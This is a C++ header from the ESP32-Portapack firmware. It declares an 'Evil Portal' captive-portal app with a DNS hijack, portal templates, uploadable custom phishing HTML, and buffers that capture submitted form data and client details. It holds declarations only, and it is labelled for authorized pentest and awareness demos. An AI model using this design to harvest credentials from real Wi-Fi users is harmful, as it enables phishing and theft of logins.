/*
 * Copyright (C) 2025 HTotoo
 *
 * This file is part of ESP32-Portapack.
 *
 * For additional license information, see the LICENSE file.
 */

#ifndef EP_APP_EVILPORTAL_HPP
#define EP_APP_EVILPORTAL_HPP

// HTML-based Evil Portal (captive portal) on-system app.
// For AUTHORIZED security awareness demos / pentest engagements only.

#include "ep_app.hpp"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include <vector>
#include <string>

#define APP_EP_PRE_STR "#$$#$$$4"
#define APP_EP_CAPTURE_STR "#$$#$$$4L"
#define APP_EP_TEMPLATE_STR "#$$#$$$4T"

#define EP_TEMPLATE_COUNT 1
#define EP_MAX_CAPTURES 40
#define EP_CAP_LEN 96      // per-capture text length (fixed, ISR-safe)
#define EP_MAX_CLIENTS 8
#define EP_CUSTOM_HTML_MAX 8192  // max size of an uploaded custom portal page

// I2C entry for a connected AP client. Kept identical on the PortaPack app side.
typedef struct __attribute__((packed)) {
    uint8_t mac[6];
    uint8_t ip[4];
    char hostname[32];
} ep_client_t;

class EPAppEvilPortal : public EPApp {
   public:
    EPAppEvilPortal();
    ~EPAppEvilPortal() override;

    bool OnPPData(uint16_t command, std::vector<uint8_t>& data) override;
    bool OnPPReqData(uint16_t command, std::vector<uint8_t>& data) override;
    bool OnWebData(std::string& data) override;
    void OnDisplayRequest(DisplayGeneric* display) override;
    void Loop(uint32_t currentMillis) override;

    static const char* getPortalHtml(size_t* out_len);
    static void onCapture(const char* body, size_t body_len, const char* host, const char* ua);

   private:
    void dnsPoll();
    void dnsStop();
    void flushCaptures();
    void selectTemplate(uint8_t idx);
    void refreshClients();  // task context only (calls esp_wifi)

    static EPAppEvilPortal* instance;
    static SemaphoreHandle_t captureMutex;

    // custom portal page uploaded from the PortaPack SD card over I2C
    // (heap-allocated to keep it out of the tight static DRAM/BSS region)
    static char* customHtml;
    static volatile uint16_t customHtmlLen;
    static volatile bool useCustomHtml;

    // captures: fixed buffers (no heap in the I2C ISR path)
    static char captureBuf[EP_MAX_CAPTURES][EP_CAP_LEN];
    volatile uint16_t captureCount = 0;
    size_t flushedCount = 0;

    // connected clients: refreshed from Loop(), read from the ISR reply path
    ep_client_t clientBuf[EP_MAX_CLIENTS] = {};
    volatile uint16_t clientCount = 0;
    uint32_t lastClientRefresh = 0;

    volatile uint16_t reqCaptureIdx = 0;
    volatile uint16_t reqClientIdx = 0;

    uint8_t currentTemplate = 0;
    bool initialized = false;
    int dnsSocket = -1;
};

#endif  // EP_APP_EVILPORTAL_HPP
